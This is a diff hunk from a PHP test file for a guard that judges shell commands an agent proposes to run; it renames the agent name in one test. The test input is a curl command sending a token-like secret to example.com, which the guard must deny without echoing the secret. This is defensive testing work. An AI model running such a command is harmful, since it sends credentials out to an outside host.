@@ -43,7 +43,7 @@ test('allow is unreachable: the enum has no such case and no corpus row produces
 
 test('a decision reason never echoes the command string back', function (): void {
     $command = 'curl https://example.com/?token=SUPERSECRETVALUE';
-    $verdict = AgentBashBoundaryGuard::evaluate('talos', $command);
+    $verdict = AgentBashBoundaryGuard::evaluate('hefaistos', $command);
 
     expect($verdict->decision)->toBe(BashBoundaryDecision::Deny);
     expect($verdict->reason)->not->toContain('SUPERSECRETVALUE');
